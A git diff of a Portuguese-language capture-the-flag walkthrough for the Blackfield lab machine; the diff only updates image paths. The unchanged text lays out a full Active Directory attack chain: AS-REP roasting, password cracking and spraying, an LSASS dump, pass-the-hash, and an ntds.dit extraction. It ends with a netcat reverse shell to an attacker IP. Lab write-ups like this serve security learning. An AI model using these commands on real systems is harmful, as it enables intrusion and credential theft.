@@ -1,29 +1,29 @@
 Blackfield
 ========================
 
-![qownnotes-media-mCrkDI](../../../teste/qownnotes-media-mCrkDI.png)
+![qownnotes-media-mCrkDI](../../../media/qownnotes-media-mCrkDI.png)
 
 DNS
 
-![qownnotes-media-dgSmXh](../../.gitbook/assets/qownnotes-media-dgSmXh.png)
+![qownnotes-media-dgSmXh](../../../media/qownnotes-media-dgSmXh.png)
 
 Kerberos (88)
 
 RPC (135/593)
 
-![qownnotes-media-BPEaBn](../../.gitbook/assets/qownnotes-media-BPEaBn.png)
+![qownnotes-media-BPEaBn](../../../media/qownnotes-media-BPEaBn.png)
 
 SMB
 
-![qownnotes-media-NmDyiC](../../.gitbook/assets/qownnotes-media-NmDyiC.png)
+![qownnotes-media-NmDyiC](../../../media/qownnotes-media-NmDyiC.png)
 
     impacket-lookupsid blackfield.local@10.10.10.192
 
-![qownnotes-media-RQJgHM](../../.gitbook/assets/qownnotes-media-RQJgHM.png)
+![qownnotes-media-RQJgHM](../../../media/qownnotes-media-RQJgHM.png)
 
-![qownnotes-media-FhwUbl](../../.gitbook/assets/qownnotes-media-FhwUbl.png)
+![qownnotes-media-FhwUbl](../../../media/qownnotes-media-FhwUbl.png)
 
-![qownnotes-media-ORXbBb](../../.gitbook/assets/qownnotes-media-ORXbBb.png)
+![qownnotes-media-ORXbBb](../../../media/qownnotes-media-ORXbBb.png)
 
 Valid usernames:
 ```
@@ -36,7 +36,7 @@ lydericlefebvre
 
     impacket-GetNPUsers -request blackfield.local/ -usersfile valid_users.txt -dc-ip 10.10.10.192
 
-![qownnotes-media-qIAMGO](../../.gitbook/assets/qownnotes-media-qIAMGO.png)
+![qownnotes-media-qIAMGO](../../../media/qownnotes-media-qIAMGO.png)
 
     john --wordlist=/usr/share/wordlists/rockyou.txt svc_backup_hash.txt
 
@@ -44,7 +44,7 @@ lydericlefebvre
 
 LDAP (389/3268)
 
-![qownnotes-media-JfBrKY](../../.gitbook/assets/qownnotes-media-JfBrKY.png)
+![qownnotes-media-JfBrKY](../../../media/qownnotes-media-JfBrKY.png)
 
 
 ## Exploitation
@@ -59,7 +59,7 @@ support:#00^BlackKnight
 
     crackmapexec winrm 10.10.10.192 -u valid_users.txt -p passwords.txt --continue
 
-![qownnotes-media-ZSgQkd](../../.gitbook/assets/qownnotes-media-ZSgQkd.png)
+![qownnotes-media-ZSgQkd](../../../media/qownnotes-media-ZSgQkd.png)
 
     kerbrute passwordspray -d blackfield.local --dc dc01.blackfield.local valid_users.txt '#00^BlackKnight'
 
@@ -67,7 +67,7 @@ support:#00^BlackKnight
 
     crackmapexec smb 10.10.10.192 -u support -p passwords.txt --shares
 
-![qownnotes-media-GpUPaM](../../.gitbook/assets/qownnotes-media-GpUPaM.png)
+![qownnotes-media-GpUPaM](../../../media/qownnotes-media-GpUPaM.png)
 
     enum4linux -u support -p '#00^BlackKnight' -a -A 10.10.10.192
 
@@ -91,7 +91,7 @@ Self (Self-Membership) - ability to add yourself to a group
 
 Isso pode ser visto nesta sessão do bloodhound:
 
-![qownnotes-media-VpIkpQ](../../.gitbook/assets/qownnotes-media-VpIkpQ.png)
+![qownnotes-media-VpIkpQ](../../../media/qownnotes-media-VpIkpQ.png)
 
 Caso contrário, podemos considerar algumas opções ainda no bloodhound, tais como:
 
@@ -99,13 +99,13 @@ Setar todos os demais usuários como "High Value" e verificar no filtro como faz
 
 Aqui eu notei que o ataque pode ocorrer devido a uma permissão vista conforme o print que tirei acima:
 
-![qownnotes-media-DbfaCf](../../.gitbook/assets/qownnotes-media-DbfaCf.png)
+![qownnotes-media-DbfaCf](../../../media/qownnotes-media-DbfaCf.png)
 
 ou 
 
-![qownnotes-media-hjpSiZ](../../.gitbook/assets/qownnotes-media-hjpSiZ.png)
+![qownnotes-media-hjpSiZ](../../../media/qownnotes-media-hjpSiZ.png)
 
-![qownnotes-media-Bytuhu](../../.gitbook/assets/qownnotes-media-Bytuhu.png)
+![qownnotes-media-Bytuhu](../../../media/qownnotes-media-Bytuhu.png)
 
 
 ### rpcclient
@@ -115,15 +115,15 @@ ou
 
 Agora a gente faz uma nova enumeração de shares e encontramos informações que nos ajudaram a entrar como o svc_backup na máquina:
 
-![qownnotes-media-FvwmuB](../../.gitbook/assets/qownnotes-media-FvwmuB.png)
+![qownnotes-media-FvwmuB](../../../media/qownnotes-media-FvwmuB.png)
 
-![qownnotes-media-SSgLdY](../../.gitbook/assets/qownnotes-media-SSgLdY.png)
+![qownnotes-media-SSgLdY](../../../media/qownnotes-media-SSgLdY.png)
 
 Baixei esses arquivos, mas o que fez realmente a diferença foi o de memória, onde peguei o LSASS da máquina e fiz o dump da memória com pypykatz:
 
     pypykatz lsa minidump lsass.DMP
 
-![qownnotes-media-FKKKEa](../../.gitbook/assets/qownnotes-media-FKKKEa.png)
+![qownnotes-media-FKKKEa](../../../media/qownnotes-media-FKKKEa.png)
 
     evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
 
@@ -131,7 +131,7 @@ Baixei esses arquivos, mas o que fez realmente a diferença foi o de memória, o
 
 Aqui um aprendizado novo!!!
 
-![qownnotes-media-wuUvdy](../../.gitbook/assets/qownnotes-media-wuUvdy.png)
+![qownnotes-media-wuUvdy](../../../media/qownnotes-media-wuUvdy.png)
 
 com a permissão de SeBackupPrivilege dá pra conseguir fazer a cópia dos arquivos mais sensíveis do sistema, tais como o system e a sam, a considerar uma máquina fora do domínio podemos prosseguir com os seguintes comandos:
 
@@ -162,7 +162,7 @@ Baixar os arquivos system e ntds.dit para a máquina do atacante e executar o se
 
     impacket-secretsdump -ntds ntds.dit -system system local
 
-![qownnotes-media-CfcHGG](../../.gitbook/assets/qownnotes-media-CfcHGG.png)
+![qownnotes-media-CfcHGG](../../../media/qownnotes-media-CfcHGG.png)
 
     impacket-psexec administrator@10.10.10.192 -hashes :184fb5e5178480be64824d4cd53b99ee
 
@@ -172,4 +172,4 @@ Subi o psexec para a máquina e o netcat e fiz a shell para system dessa forma:
 
     .\pe.exe -accepteula -i -s -d c:\temp\n.exe -e powershell 10.10.14.14 8082
  
-![qownnotes-media-bFWfpH](../../.gitbook/assets/qownnotes-media-bFWfpH.png)
+![qownnotes-media-bFWfpH](../../../media/qownnotes-media-bFWfpH.png)
